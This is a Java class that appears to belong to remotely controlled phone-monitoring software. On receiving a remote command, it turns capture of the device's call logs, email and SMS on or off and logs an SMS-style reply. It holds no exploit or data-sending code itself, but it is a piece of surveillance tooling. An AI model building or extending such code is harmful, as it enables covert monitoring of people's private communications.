package com.vvt.rmtcmd.pcc;

import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.global.Global;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.PhoneixCompliantCommand;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCCaptureStateCommand extends PCCRmtCmdAsync {
	
	private int mode = 0;
	
	public PCCCaptureStateCommand(int mode) {
		this.mode = mode;
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(PhoneixCompliantCommand.CAPTURE_STATE);
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		doSMSHeader();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		try {
			Preference pref = Global.getPreference();
			PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			if (mode == DISABLE) {
				eventInfo.setCallLogEnabled(false);
				eventInfo.setEmailEnabled(false);
				eventInfo.setSMSEnabled(false);
			} else {
				eventInfo.setCallLogEnabled(true);
				eventInfo.setEmailEnabled(true);
				eventInfo.setSMSEnabled(true);
			}
			pref.commit(eventInfo);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		systemEvent.setSystemMessage(responseMessage.toString());
		db.insert(systemEvent);
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
